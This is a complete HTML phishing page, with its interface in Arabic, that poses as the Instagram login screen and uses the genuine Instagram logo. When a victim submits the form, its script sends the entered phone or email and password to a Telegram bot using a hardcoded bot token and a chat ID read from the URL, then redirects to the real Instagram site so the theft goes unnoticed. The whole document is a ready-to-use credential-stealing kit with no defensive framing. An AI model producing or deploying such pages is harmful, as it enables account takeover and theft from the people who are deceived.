<!DOCTYPE html>
<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Instagram</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:40px;width:350px;text-align:center}
img{width:175px;margin-bottom:24px}h2{color:#262626;margin-bottom:15px}
input{width:100%;padding:10px 8px;margin:4px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}
.btn{background:#0095f6;color:#fff;border:none;padding:8px;width:100%;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}.btn:hover{background:#1877f2}</style></head>
<body><div class="card">
<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
<h2>تسجيل الدخول إلى Instagram</h2>
<input id="u" placeholder="رقم الهاتف أو البريد الإلكتروني"><br>
<input id="p" type="password" placeholder="كلمة المرور"><br>
<button class="btn" onclick="sendData()">تسجيل الدخول</button>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
if(!u||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('📷 Instagram\n👤 '+u+'\n🔑 '+pa)}`)
.then(()=>{location.href='https://www.instagram.com/'})}
</script></body></html>
